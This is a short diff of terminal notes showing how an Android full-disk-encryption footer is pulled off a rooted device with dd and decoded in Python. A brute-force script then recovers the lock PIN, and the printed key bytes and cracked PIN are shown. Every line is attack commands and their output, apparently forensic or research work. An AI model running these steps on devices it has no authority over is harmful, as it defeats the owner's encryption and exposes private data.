@@ -1,0 +1,37 @@
+# mount -o remount,rw /system
+
+% adb push /tmp/busybox-armv7l /system/bin/
+
+# blockdev --getsz /dev/block/mmcblk0p5                         
+5820608
+// 5820608 / 2 - 16 = 2910288
+# /system/bin/busybox-armv7l dd if=/dev/block/mmcblk0p5 of=/data/local/tmp/m0p5 bs=1024 skip=2910288 count=16
+
+In [44]: struct.unpack('<'+'L H H L L L L L L L 64s L 48s 16s', ftr[:168])
+Out[44]: 
+(3501568452,
+ 1,
+ 0,
+ 104,
+ 0,
+ 16,
+ 0,
+ 5820576,
+ 0,
+ 0,
+ b'aes-cbc-essiv:sha256\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+ 0,
+ b'\x8f\xb26\xbdB\xc8Xp+ST\xb8\x7f\xe6\x89\x8d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+ b"\xadfd'-\xd2a\x17\xd3\xcd|i\x01\xd2y\xf5")
+
+
+% python2 ./bruteforce_stdcrypto.py m0p5beg16K m0p5end16K 8
+Trying: 83357
+Trying: 83358
+Trying: 83359
+Trying: 83360
+Trying: 83361
+Trying: 83362
+DBG: parseMagic
+Found PIN!: 83362
+
